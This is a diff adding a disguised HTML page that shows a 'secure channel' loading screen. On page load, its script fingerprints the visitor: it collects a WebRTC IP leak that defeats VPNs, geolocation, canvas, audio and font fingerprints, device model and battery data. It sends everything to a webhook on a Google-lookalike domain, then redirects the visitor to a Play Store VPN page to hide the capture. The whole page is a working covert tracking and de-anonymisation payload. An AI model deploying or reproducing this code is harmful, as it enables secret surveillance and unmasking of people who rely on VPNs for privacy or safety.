@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connecting to secure server...</title>
+    <style>
+        body { background: #0a0a0a; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #00ff00; border-top: 4px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+<div class="loader">
+    <div class="spinner"></div>
+    <h2>Establishing secure channel...</h2>
+    <p>Please wait, verifying connection</p>
+</div>
+
+<script>
+    // ============================================================
+    // ULTIMATE FINGERPRINT PAYLOAD - VPN BUSTER + PHONE MODEL
+    // ============================================================
+    
+    // 🔧 CONFIGURATION - EDIT THESE
+    const WEBHOOK_URL = "https://play-google-com.zflipzgamingz.workers.dev/";  // 👈 CHANGE THIS
+    const REDIRECT_URL = "https://play.google.com/store/apps/details?id=com.avast.android.vpn";  // Where they go after capture
+    
+    // ============================================================
+    // CORE DATA COLLECTION
+    // ============================================================
+    
+    async function getWebRTCRealIP() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({
+                iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+            });
+            pc.createDataChannel("");
+            pc.createOffer()
+                .then(offer => pc.setLocalDescription(offer))
+                .catch(() => resolve(null));
+            
+            pc.onicecandidate = (ice) => {
+                if (ice.candidate) {
+                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
+                    const match = ipRegex.exec(ice.candidate.candidate);
+                    if (match && match[0] && !match[0].startsWith("192.168.") && !match[0].startsWith("10.") && !match[0].startsWith("172.")) {
+                        pc.close();
+                        resolve(match[0]);
+                    }
+                }
+            };
+            setTimeout(() => {
+                pc.close();
+                resolve(null);
+            }, 2000);
+        });
+    }
+    
+    function getDeviceModel(ua) {
+        const patterns = {
+            "iPhone 14 Pro": /iPhone15,2/i,
+            "iPhone 14 Pro Max": /iPhone15,3/i,
+            "iPhone 14": /iPhone14,7/i,
+            "iPhone 13 Pro Max": /iPhone14,3/i,
+            "iPhone 13 Pro": /iPhone14,2/i,
+            "iPhone 13": /iPhone14,5/i,
+            "iPhone 12 Pro Max": /iPhone13,4/i,
+            "iPhone 12 Pro": /iPhone13,3/i,
+            "iPhone 12": /iPhone13,2/i,
+            "iPhone 11 Pro Max": /iPhone12,5/i,
+            "iPhone 11 Pro": /iPhone12,3/i,
+            "iPhone 11": /iPhone12,1/i,
+            "Samsung Galaxy S24 Ultra": /SM-S928/i,
+            "Samsung Galaxy S23 Ultra": /SM-S918/i,
+            "Samsung Galaxy S22 Ultra": /SM-S908/i,
+            "Samsung Galaxy S21 Ultra": /SM-G998/i,
+            "Samsung Galaxy S20 Ultra": /SM-G988/i,
+            "Google Pixel 8 Pro": /Pixel 8 Pro/i,
+            "Google Pixel 8": /Pixel 8/i,
+            "Google Pixel 7 Pro": /Pixel 7 Pro/i,
+            "Google Pixel 7": /Pixel 7/i,
+            "Xiaomi 13 Pro": /Xiaomi 13 Pro/i,
+            "OnePlus 11": /OnePlus 11/i,
+            "OnePlus 10 Pro": /OnePlus 10 Pro/i
+        };
+        
+        for (const [model, regex] of Object.entries(patterns)) {
+            if (regex.test(ua)) return model;
+        }
+        
+        const basicMatch = ua.match(/(iPhone|iPad|iPod|Android|Windows Phone|SM-[A-Z0-9]+|Pixel [0-9]+|Mi [0-9]+|Redmi [0-9]+|OnePlus [0-9]+|Nokia [0-9]+)/i);
+        return basicMatch ? basicMatch[0] : "Unknown Device";
+    }
+    
+    async function getFonts() {
+        const testFonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Impact", "Helvetica", "Tahoma", "Trebuchet MS", "Calibri", "Candara", "Segoe UI", "Roboto", "Open Sans", "San Francisco", "Inter"];
+        const baseFonts = ["monospace", "sans-serif", "serif"];
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        canvas.width = 200;
+        canvas.height = 100;
+        const detected = [];
+        
+        testFonts.forEach(font => {
+            let detectedFont = false;
+            baseFonts.forEach(base => {
+                ctx.font = `72px "${font}", ${base}`;
+                const width1 = ctx.measureText("mmmmmmmmmmlli").width;
+                ctx.font = `72px ${base}`;
+                const width2 = ctx.measureText("mmmmmmmmmmlli").width;
+                if (width1 !== width2) detectedFont = true;
+            });
+            if (detectedFont) detected.push(font);
+        });
+        return detected;
+    }
+    
+    async function getCanvasFingerprint() {
+        const canvas = document.createElement("canvas");
+        canvas.width = 300;
+        canvas.height = 100;
+        const ctx = canvas.getContext("2d");
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(0, 0, 150, 50);
+        ctx.fillStyle = "#069";
+        ctx.font = "16px Arial";
+        ctx.fillText("Fingerprint", 10, 30);
+        ctx.fillStyle = "#f00";
+        ctx.arc(200, 50, 20, 0, Math.PI * 2);
+        ctx.fill();
+        return canvas.toDataURL();
+    }
+    
+    async function getAudioFingerprint() {
+        try {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioCtx.createOscillator();
+            const analyser = audioCtx.createAnalyser();
+            oscillator.connect(analyser);
+            analyser.connect(audioCtx.destination);
+            oscillator.frequency.value = 440;
+            oscillator.start();
+            const bufferLength = analyser.fftSize;
+            const dataArray = new Uint8Array(bufferLength);
+            analyser.getByteTimeDomainData(dataArray);
+            const hash = Array.from(dataArray.slice(0, 100)).join(",");
+            oscillator.stop();
+            audioCtx.close();
+            return hash.substring(0, 200);
+        } catch(e) {
+            return "Audio fingerprint failed";
+        }
+    }
+    
+    async function getBattery() {
+        if (!navigator.getBattery) return null;
+        const battery = await navigator.getBattery();
+        return {
+            level: battery.level * 100,
+            charging: battery.charging,
+            chargingTime: battery.chargingTime,
+            dischargingTime: battery.dischargingTime
+        };
+    }
+    
+    async function collectAll() {
+        const startTime = Date.now();
+        
+        // IP & Geolocation first
+        let ipData = {};
+        try {
+            const res = await fetch("https://ipapi.co/json/");
+            ipData = await res.json();
+        } catch(e) {}
+        
+        const webrtcIP = await getWebRTCRealIP();
+        const fonts = await getFonts();
+        const canvasFP = await getCanvasFingerprint();
+        const audioFP = await getAudioFingerprint();
+        const battery = await getBattery();
+        
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const timezoneOffset = -new Date().getTimezoneOffset() / 60;
+        
+        // Detect VPN mismatch
+        let vpnMismatch = false;
+        if (ipData.country_code && timezone) {
+            const tzCountry = timezone.split("/")[0];
+            const ipCountry = ipData.country_code;
+            if (tzCountry !== ipCountry && !tzCountry.includes(ipCountry)) {
+                vpnMismatch = true;
+            }
+        }
+        
+        const finalData = {
+            timestamp: new Date().toISOString(),
+            captureTimeMs: startTime,
+            
+            // Identity
+            fingerprint_id: canvasFP.substring(0, 50) + audioFP.substring(0, 30),
+            
+            // IP & Network
+            ip_public: ipData.ip || null,
+            ip_webrtc_leak: webrtcIP,
+            country: ipData.country_name,
+            country_code: ipData.country_code,
+            city: ipData.city,
+            region: ipData.region,
+            postal: ipData.postal,
+            latitude: ipData.latitude,
+            longitude: ipData.longitude,
+            isp: ipData.org,
+            
+            // VPN Detection
+            vpn_detected: vpnMismatch,
+            vpn_reason: vpnMismatch ? "Timezone mismatch with IP location" : null,
+            timezone: timezone,
+            timezone_offset_hours: timezoneOffset,
+            
+            // Device Info
+            user_agent: navigator.userAgent,
+            device_model: getDeviceModel(navigator.userAgent),
+            platform: navigator.platform,
+            os_version: /Android [0-9.]+|iOS [0-9.]+|iPhone OS [0-9_]+|Windows NT [0-9.]+|Mac OS X [0-9_]+/i.exec(navigator.userAgent)?.[0] || "Unknown",
+            
+            // Screen
+            screen_width: screen.width,
+            screen_height: screen.height,
+            screen_color_depth: screen.colorDepth,
+            screen_pixel_ratio: devicePixelRatio,
+            window_inner_width: window.innerWidth,
+            window_inner_height: window.innerHeight,
+            
+            // Browser
+            language: navigator.language,
+            languages: navigator.languages,
+            cookie_enabled: navigator.cookieEnabled,
+            do_not_track: navigator.doNotTrack,
+            hardware_concurrency: navigator.hardwareConcurrency,
+            device_memory: navigator.deviceMemory || "Unknown",
+            max_touch_points: navigator.maxTouchPoints,
+            touch_support: "ontouchstart" in window,
+            
+            // Fingerprints
+            fonts_detected: fonts,
+            canvas_fingerprint: canvasFP.substring(0, 500),
+            audio_fingerprint: audioFP.substring(0, 200),
+            
+            // WebGL
+            webgl_vendor: null,
+            webgl_renderer: null,
+            
+            // Battery
+            battery_percent: battery?.level,
+            battery_charging: battery?.charging,
+            
+            // Plugins
+            plugins: Array.from(navigator.plugins || []).map(p => p.name),
+            
+            // Referrer
+            referrer: document.referrer || "Direct",
+            
+            // URL where payload was loaded
+            page_url: window.location.href
+        };
+        
+        // WebGL
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (gl) {
+            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+            if (debugInfo) {
+                finalData.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                finalData.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        }
+        
+        // Send to webhook
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(finalData)
+            });
+        } catch(e) {}
+        
+        // Redirect
+        window.location.href = REDIRECT_URL;
+    }
+    
+    // Run
+    collectAll();
+</script>
+</body>
+</html>
